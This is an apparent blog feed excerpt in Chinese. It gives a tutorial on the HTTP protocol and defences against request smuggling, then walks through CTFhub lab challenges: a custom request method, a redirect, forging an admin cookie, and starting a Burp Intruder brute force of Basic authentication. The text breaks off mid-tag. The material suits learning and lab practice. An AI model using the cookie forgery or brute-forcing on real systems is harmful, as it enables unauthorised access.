title="漏洞防御"></a>漏洞防御</h2><p>在前端服务器通过同一网络连接将多个请求转发到后端服务器的情况下，会出现HTTP请求走私漏洞，并且后端连接所使用的协议会带来两个服务器不同意边界的风险。要求。防止HTTP请求走私漏洞的一些通用方法如下：</p><ul><li>禁用后端连接的重用，以便每个后端请求通过单独的网络连接发送。</li><li>使用HTTP / 2进行后端连接，因为此协议可防止对请求之间的边界产生歧义。</li><li>前端服务器和后端服务器使用完全相同的Web服务器软件，以便它们就请求之间的界限达成一致。</li></ul><p>在某些情况下，可以通过使前端服务器规范歧义请求或使后端服务器拒绝歧义请求并关闭网络连接来避免漏洞。但是，这些方法比上面确定的通用缓解措施更容易出错。</p><p>参考文章：<br><a href="https://paper.seebug.org/1048">https://paper.seebug.org/1048</a><br><a href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a><br><a href="https://portswigger.net/web-security/request-smuggling/exploiting">https://portswigger.net/web-security/request-smuggling/exploiting</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：HTTP请求走私漏洞学习&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="WEB" scheme="http://atkx.top/categories/CTF/WEB/"/>
    
    
    <category term="漏洞复现" scheme="http://atkx.top/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>HTTP协议</title>
    <link href="http://atkx.top/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/"/>
    <id>http://atkx.top/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/</id>
    <published>2021-04-11T06:30:15.000Z</published>
    <updated>2021-05-27T12:45:43.495Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：深入学习HTTP协议</p> <a id="more"></a><h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><h2 id="HTTP协议简介"><a href="#HTTP协议简介" class="headerlink" title="HTTP协议简介"></a>HTTP协议简介</h2><p>超文本传输协议 (HTTP-Hypertext transfer protocol) 是一种详细规定了浏览器和万维网服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。通常，由HTTP客户端发起一个请求，建立一个到服务器指定端口（默认是80端口）的TCP连接。HTTP服务器则在那个端口监听客户端发送过来的请求。一旦收到请求，服务器（向客户端）发回一个状态行，比如”HTTP/1.1 200 OK”，和（响应的）消息，消息的消息体可能是请求的文件、错误消息、或者其它一些信息。HTTP使用TCP而不是UDP的原因在于（打开一个）一个网页必须传送很多数据，而TCP协议提供传输控制，按顺序组织数据，和错误纠正。</p><p>从层次的角度看，HTTP是面向事务的(transaction-oriented)应用层协议，它是万维网上能够可靠地交换文件(包括文本、声音、图像等各种多媒体文件)的重要基础。</p><p>交互过程如下：<br><img src="https://img-blog.csdnimg.cn/20210329204302530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>http协议思维导图<br><img src="https://img-blog.csdnimg.cn/20210409104101378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="HTTP协议特点"><a href="#HTTP协议特点" class="headerlink" title="HTTP协议特点"></a>HTTP协议特点</h2><p>1.基于请求/响应模型的协议。</p><ul><li>请求和响应必须成对，先有请求后有响应</li></ul><p>2.简单快速</p><ul><li>客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。</li></ul><p>3.灵活</p><ul><li>HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。</li></ul><p>4.无连接</p><ul><li>每次请求一次，释放一次连接。所以无连接表示每次连接只能处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</li></ul><p>5.无状态</p><ul><li>HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</li></ul><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>HTTP是基于客户/服务器模式，且面向连接的。典型的HTTP事务处理有如下的过程分为四步：<br>（1）客户与服务器建立连接<br>　　首先客户机与服务器需要建立连接。只要单击某个超级链接，HTTP的工作就开始了。<br>（2）客户向服务器提出请求<br>　　建立连接后，客户机发送一个请求给服务器，请求方式的格式为：统一资源标识符（URL）、协议版本号，后边是MIME信息包括请求修饰符、客户机信息和可能的内容。<br>（3）服务器接受请求，并根据请求返回相应的文件作为应答<br>　　服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是MIME信息包括服务器信息、实体信息和可能的内容。<br>（4）客户与服务器关闭连接<br>　　 客户端接收服务器所返回的信息通过浏览器显示在用户的显示屏上，然后客户机与服务器断开连接。</p><p>　　如果在以上过程中的某一步出现错误，那么产生错误的信息将返回到客户端。　　</p><h2 id="HTTP协议发展史"><a href="#HTTP协议发展史" class="headerlink" title="HTTP协议发展史"></a>HTTP协议发展史</h2><h3 id="HTTP-0-9"><a href="#HTTP-0-9" class="headerlink" title="HTTP/0.9"></a>HTTP/0.9</h3><p>0.9版本是第一个定稿的HTTP版本，相对较为简陋。它有以下特点：</p><ul><li><p>只接受 GET 一种请求方法</p></li><li><p>没有header等描述数据的信息</p></li><li><p>服务器发送完毕，就关闭TCP连接</p></li></ul><p>由于该版本不支持 POST 方法，所以客户端无法向服务器传递太多信息</p><h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h3><p>1.0版本在0.9版本上做出了很多创新和优化，该版本：</p><ul><li><p>增加了新的命令（POST命令和HEADER命令）</p></li><li><p>增加status code（状态码）和header</p></li><li><p>增加多字符集支持、多部分发送、authorization（权限）、cache（缓存）等</p></li></ul><p>这是第一个在通讯中指定版本号的HTTP 协议版本，在这个版本，基本实现了HTTP协议的框架。</p><h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h3><p>1.1版本解决了大量1.0版本的痛点，该版本新增了以下功能：</p><ul><li><p>持久连接（keep alive）</p></li><li><p>管道化（pipeline）</p></li><li><p>host和其他一些命令</p></li></ul><h3 id="HTTP-2-0"><a href="#HTTP-2-0" class="headerlink" title="HTTP/2.0"></a>HTTP/2.0</h3><p>HTTP2.0的前身是HTTP1.0和HTTP1.1,是HTTP 协议的第二个主要版本，该版本关注于减少延迟时间，从而提高页面加载速度。HTTP/2 是基于 SPDY 协议的，打开一个 TCP 连接并重复使用，这使得许多请求得以并行发送，而无需等待响应。</p><p>HTTP/2.0优势是:</p><ul><li><p>所有数据二进制传输</p></li><li><p>同一链接多个请求不再按照顺序来</p></li><li><p>头信息压缩以及推送等提高效率的功能</p></li></ul><h1 id="HTTP报文格式"><a href="#HTTP报文格式" class="headerlink" title="HTTP报文格式"></a>HTTP报文格式</h1><p>用于HTTP协议交互的信息被称为报文。</p><p>请求端（客户端）的HTTP报文叫做请求报文，响应端（服务器端）的叫做响应报文。HTTP报文本身是由多行数据构成的字符串文本。HTTP报文大致上可分为报文首部和报文主体两块，两者由最初出现的空行来划分。<br>通常来说，并不一定要有报文主体。</p><p>HTTP报文由三部分组成：</p><p>（1)起始行：<br>报文的第一行就是起始行,用于区分是请求报文还是响应报文，请求报文中开始行叫做请求行，而响应报文中，开始行叫做状态行。在开始行的三个字段之间都用空格分开，结尾处 CRLF 表示回车和换行。</p><p>（2)首部行：<br>起始行后面有零个或多个字段。每个字段都包含一个名字和一个值,为了便于解析,两者之间用冒号(:)来分隔，首部以一个空行结束。<br>用于说明浏览器、服务器或报文主体的一些信息。在每一个首部行中都有首部字段名和它的值，每一行在结束的地方都要有“回车”和“换行”。整个首部行结束时，还有以空行将首部行和后面的实体分开。</p><p>（3)主体：<br>空行之后就是可选的报文主体了，其中包含了所有类型的数据。请求主体是要发送给服务器的数据;响应主体是要返回给客户端的数据。在请求报文中一般不用这个字段，而在响应报文中也可能没有这个字段。</p><h2 id="Request请求报文"><a href="#Request请求报文" class="headerlink" title="Request请求报文"></a>Request请求报文</h2><blockquote><p>  HTTP请求报文——从客户向服务器发送请求报文</p></blockquote><p>  HTTP的请求报文由三部分组成 : 请求行 , 首部行和实体 , 如下图 :<br><img src="https://img-blog.csdnimg.cn/20210328202511308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>请求行：请求行由请求方法字段、URL字段和HTTP协议版本字段3个字段组成，它们用空格分隔。比如 GET /data/info.html HTTP/1.1。方法字段就是HTTP使用的请求方法，比如常见的GET/POST</li><li>请求头：浏览器向服务器发送请求的时候必须指明请求类型(一般是GET或者 POST)。如有必要，客户程序还可以选择发送其他的请求头。大多数请求头并不是必需的，但Content-Length除外。对于POST请求来说 Content-Length必须出现。</li><li>实体：若方法字段是GET，则此项为空，没有数据。若方法字段是POST,则通常来说此处放置的就是要提交的数据</li></ul><h3 id="请求报文实例"><a href="#请求报文实例" class="headerlink" title="请求报文实例"></a>请求报文实例</h3><p>抓包本地搭建的登陆页面，得到请求头：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /<span class="hljs-built_in">test</span>/login.html HTTP/1.1        <span class="hljs-comment">#请求方法为POST，请求URL为/test/login.html，HTTP协议版本为HTTP/1.1</span><br>Host: 127.0.0.1<span class="hljs-comment">#客户机通过这个头告诉服务器，想访问的主机名</span><br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0  <span class="hljs-comment">#指定用户代理服务器的类型。</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2   <span class="hljs-comment">#指出客户浏览器支持的语言是英语（english）</span><br>Accept-Encoding: gzip, deflate        <span class="hljs-comment">#指出发送此请求的浏览器支持哪些压缩编码方式。</span><br>Content-Type: application/x-www-form-urlencoded      <span class="hljs-comment">#表示后面的文档属于什么MIME类型</span><br>Content-Length: 26 <span class="hljs-comment">#表示内容长度</span><br>Origin: http://127.0.0.1     <span class="hljs-comment">#Origin主要是用来说明最初请求是从哪里发起的；</span><br>Connection: close         <span class="hljs-comment">#是在告知服务器本浏览器不想使用永久连接方式（HTTP/1.0使用非永久连接，HTTP/1.1默认使用永久连接）。</span><br>Referer: http://127.0.0.1/<span class="hljs-built_in">test</span>/index.html   <span class="hljs-comment">#客户机通过这个头告诉服务器，它是从哪个资源来访问服务器的</span><br>Cookie: _ga=GA1.1.1592130974.1616653076; bdshare_firstime=1616653211943       <span class="hljs-comment">#客户机通过这个头可以向服务器带数据</span><br>Upgrade-Insecure-Requests: 1        <span class="hljs-comment">#表示能读懂服务器发过来的上面这条信息</span><br><br>username=<span class="hljs-built_in">test</span>&amp;password=123     <span class="hljs-comment">#请求数据</span><br></code></pre></td></tr></table></figure><h3 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h3><p>方法字段指出客户请求服务器执行的一般操作。HTTP/1.1中定义了八种请求方法，其中GET、POST、HEAD、是常用请求方法。</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>GET</td><td>获取一个URL指定的资源,即资源实体。</td></tr><tr><td>POST</td><td>传输实体主体,向服务器提交数据。</td></tr><tr><td>HEAD</td><td>获取一个指定资源的信息,类似GET方法，区别在于只返回报文首部，不返回报文主体。</td></tr><tr><td>PUT</td><td>向服务器提交资源,用来传输文件。</td></tr><tr><td>DELETE</td><td>请求源服务器删除Request-URI标识的资源,用来删除文件。</td></tr><tr><td>TRACE</td><td>网络跟踪</td></tr><tr><td>CONNECT</td><td>与PROXY之间的连接管理,要求用隧道协议连接代理。</td></tr><tr><td>OPTIONS</td><td>查询能力,询问支持方法返回服务器支持的方法。</td></tr></tbody></table><p><strong>GET和POST之间的区别</strong></p><p>1、GET方法的数据参数是暴露在起始行的URL中的，而POST方法的数据参数是在报文主体中的。<br>2、GET方法相对来说没有POST安全，因为它的数据参数可以直接从URL中获取，但是GET的效率更高。<br>3、GET方法的数据参数大小有一定的限制（1024）（原因也是因为它的数据参数是放在URL中的），而POST对数据大小是没有限制的。<br>其实他们的本质区别是GET是从服务器上请求数据，而POST是向服务器发送数据</p><h3 id="请求报文属性"><a href="#请求报文属性" class="headerlink" title="请求报文属性"></a>请求报文属性</h3><p>请求头部为请求报文添加了一些附加信息，由“名/值”对组成，每行一对，名和值之间使用冒号分隔</p><p>常见请求头如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">Client-IP：提供了运行客户端的机器的IP地址<br><br>From：提供了客户端用户的E-mail地址<br><br>Host：给出了接收请求的服务器的主机名和端口号<br><br>Referer：提供了包含当前请求URI的文档的URL，服务器能知道你是从哪个页面过来的<br><br>UA-Color：提供了与客户端显示器的显示颜色有关的信息<br><br>UA-CPU：给出了客户端CPU的类型或制造商<br><br>UA-OS：给出了运行在客户端机器上的操作系统名称及版本<br><br>User-Agent：将发起请求的应用程序名称告知服务器 <br>      <br>Accept：告诉服务器能够发送哪些媒体类型<br><br>Accept-Charset：告诉服务器能够发送哪些字符集<br><br>Accept-Encoding：告诉服务器能够发送哪些编码方式<br><br>Accept-Language：告诉服务器能够发送哪些语言<br><br>TE：告诉服务器可以使用那些扩展传输编码<br><br>Expect：允许客户端列出某请求所要求的服务器行为<br><br>Range：如果服务器支持范围请求，就请求资源的指定范围<br><br>Cookie：客户端用它向服务器传送数据<br><br>Cookie2：用来说明请求端支持的cookie版本<br><br>Upgrade-Insecure-Requests：表示能读懂服务器发过来的上面这条信息，并且在以后发请求的时候不用http而用https<br></code></pre></td></tr></table></figure><h2 id="Response响应报文"><a href="#Response响应报文" class="headerlink" title="Response响应报文"></a>Response响应报文</h2><blockquote><p>  HTTP响应报文——从服务器到客户的回答</p></blockquote><p>   HTTP的请求报文由三部分组成 : 状态行 、 首部行和实体 , 如下图 :<br><img src="https://img-blog.csdnimg.cn/20210328202534215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>响应行：响应行一般由协议版本、状态码及其描述组成 比如 HTTP/1.1 200 OK。其中协议版本HTTP/1.1或者HTTP/1.0，200就是它的状态码，OK则为它的描述。</li><li>响应头：响应头用于描述服务器的基本信息，以及数据的描述，服务器通过这些数据的描述信息，可以通知客户端如何处理等一会儿它回送的数据。</li><li>响应体：响应体就是响应的消息体，如果是纯数据就是返回纯数据，如果请求的是HTML页面，那么返回的就是HTML代码，如果是JS就是JS代码，如此之类。<h3 id="响应报文实例"><a href="#响应报文实例" class="headerlink" title="响应报文实例"></a>响应报文实例</h3>抓包本地搭建的登陆页面，得到响应头：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">HTTP/1.1 200 OK   <span class="hljs-comment">#HTTP协议及版本 状态码</span><br>Date: Mon, 29 Mar 2021 02:57:52 GMT  <span class="hljs-comment">#服务器创建并发送本响应消息的日期和时间。</span><br>Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45  <span class="hljs-comment">#服务器和版本号</span><br>Last-Modified: Mon, 29 Mar 2021 02:57:07 GMT  <span class="hljs-comment">#对象本身的创建或最后修改日期或时间</span><br>ETag: <span class="hljs-string">&quot;8e-5bea4098d63cb&quot;</span>   <span class="hljs-comment">#缓存相关的头</span><br>Accept-Ranges: bytes  <span class="hljs-comment">#标识自身支持范围请求(partial requests)</span><br>Content-Length: 142  <span class="hljs-comment">#所发送对象的字节数</span><br>Connection: close    <span class="hljs-comment">#处理完这次请求后是否断开连接还是继续保持连接</span><br>Content-Type: text/html  <span class="hljs-comment">#包含在实体中的对象是HTML文本</span><br><br>&lt;!DOCTYPE html&gt;    <span class="hljs-comment">#实体部分</span><br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>    &lt;title&gt;succsss&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>Login succsss!!!<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">HTTP 响应代码</a>，状态代码由服务器发出，以响应客户端对服务器的请求。</p><p>请求报文的方法字段是对所请求对象进行的操作，而响应报文的状态码是一个 3 位数字，可以分为以下 5 类 ：</p><table><thead><tr><th>状态码类别</th><th>描述</th></tr></thead><tbody><tr><td>1xx</td><td>收到请求，继续处理。</td></tr><tr><td>2xx</td><td>请求已成功接收，理解和接受</td></tr><tr><td>3xx</td><td>重定向到其它地方</td></tr><tr><td>4xx</td><td>客户的差错，请求包含错误的语法或无法满足。</td></tr><tr><td>5xx</td><td>服务器的差错，服务器无法满足明显有效的请求</td></tr></tbody></table><p>常见的状态码：</p><table><thead><tr><th>状态码</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td>200</td><td>OK</td><td>表示从客户端发送给服务器的请求被正常处理并返回</td></tr><tr><td>204</td><td>No Content</td><td>表示客户端发送给客户端的请求得到了成功处理，但在返回的响应报文中不含实体的主体部分</td></tr><tr><td>301</td><td>Moved Permanently</td><td>永久重定向，表示请求的资源被分配了新的URL，之后应使用更改的URL。</td></tr><tr><td>302</td><td>Found</td><td>临时重定向，表示请求的资源被分配了新的URL，希望本次访问使用新的URL。</td></tr><tr><td>304</td><td>Not Modified</td><td>缓存文件并未过期，还可继续使用，无需再次从服务端获取</td></tr><tr><td>400</td><td>Bad Request</td><td>客户端请求有语法错误，不能被服务器识别</td></tr><tr><td>401</td><td>Unauthorized</td><td>未经许可，需要通过HTTP认证</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器接收到请求，但是拒绝提供服务。</td></tr><tr><td>404</td><td>Not Found</td><td>请求资源不存在</td></tr><tr><td>500</td><td>Internal Server Error</td><td>服务器内部错误</td></tr><tr><td>503</td><td>Server Unavailable</td><td>服务器暂时不能处理客户端的请求</td></tr></tbody></table><h3 id="响应报文属性"><a href="#响应报文属性" class="headerlink" title="响应报文属性"></a>响应报文属性</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml">Age：(从最初创建开始)响应持续时间<br><br>Public：服务器为其资源支持的请求方法列表<br><br>Retry-After：如果资源不可用的话，在此日期或时间重试<br><br>Server：服务器应用程序软件的名称和版本<br><br>Title：对HTML文档来说，就是HTML文档的源端给出的标题<br><br>Warning：比原因短语更详细一些的警告报文<br><br>ETag：一个代表响应服务端资源（如页面）版本的报文头属性，如果某个服务端资源发生变化了，这个ETag就会相应发生变化。<br><br>Accept-Ranges：对此资源来说，服务器可接受的范围类型<br><br>Vary：服务器会根据这些首部的内容挑选出最适合的资源版本发送给客户端<br><br>Proxy-Authenticate：来自代理的对客户端的质询列表<br><br>Set-Cookie：服务端可以设置客户端的Cookie，以便服务器对客户端进行标识。<br><br>Set-Cookie2：与Set-Cookie类似<br><br>WWW-Authenticate：来自服务器的对客户端的质询列表<br><br></code></pre></td></tr></table></figure><h1 id="HTTP协议实战练习"><a href="#HTTP协议实战练习" class="headerlink" title="HTTP协议实战练习"></a>HTTP协议实战练习</h1><p>题目来自CTFhub靶场：Web前置技能-HTTP协议</p><h2 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h2><p>HTTP 请求方法, HTTP/1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。</p><p><img src="https://img-blog.csdnimg.cn/20210329161254214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>方法一：<br>burpsite抓包，自定义CTFHUB方法请求 index.php 即可拿到 flag。<br><img src="https://img-blog.csdnimg.cn/20210329161305347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>方法二：<br>使用curl命令查看服务器的返回信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -v -X CTFHUB challenge-9661cba9e188a4c8.sandbox.ctfhub.com:10080/index.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210329162918897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><p>HTTP临时重定向<br><img src="https://img-blog.csdnimg.cn/20210329202651177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>点击超链接无反应，查看源码发现了index.php，而此时url栏是index.html<br><img src="https://img-blog.csdnimg.cn/20210329202712652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>burpsite抓包，在响应包得到flag<br><img src="https://img-blog.csdnimg.cn/20210329202803184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>方法二：<br>curl命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -i http://challenge-f6959bd27c1b2b09.sandbox.ctfhub.com:10080/index.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210329161745105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl命令<br>https://blog.csdn.net/qq_45738111/article/details/105265455<br></code></pre></td></tr></table></figure><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookie欺骗、认证、伪造</p><p><a href="http://challenge-67f523772f2e5d91.sandbox.ctfhub.com:10080/">http://challenge-67f523772f2e5d91.sandbox.ctfhub.com:10080</a><br>方法一：</p><p>抓包，响应头提示只有admin才能得到flag，此时请求头Cookie的值为admin=0<br><img src="https://img-blog.csdnimg.cn/20210329200457714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>改为admin=1，得到flag<br><img src="https://img-blog.csdnimg.cn/20210329200506541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>方法二：</p><p>可以使用curl命令的”-H”参数来为http请求头添加cookie键值来发送cookie：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -i -H <span class="hljs-string">&quot;Cookie:admin=1&quot;</span> http://challenge-67f523772f2e5d91.sandbox.ctfhub.com:10080/<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210329191357125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a>基础认证</h2><p>在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 <a href="https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81">https://zh.wikipedia.org/wiki/HTTP基本认证</a></p><p>访问题目地址<br><img src="https://img-blog.csdnimg.cn/20210329192024754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>跳转到登陆页面<br><img src="https://img-blog.csdnimg.cn/2021032919204261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>先输入弱密码admin\123456登陆，然后抓包<br><img src="https://img-blog.csdnimg.cn/20210329192830793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在请求头发现一段base64编码，解码得到<code>admin:123456</code>，而在响应头发现一段话Do u know admin ?，再结合题目附件中给的字典，所以说本题应该是爆破管理员密码，与以往爆破密码不同的是，账号和密码一起被base64加密了。</p><p>将请求报文发送到Intruder，点击Add，将 Basic 后面 base64 部分添加为 payload position<br><img 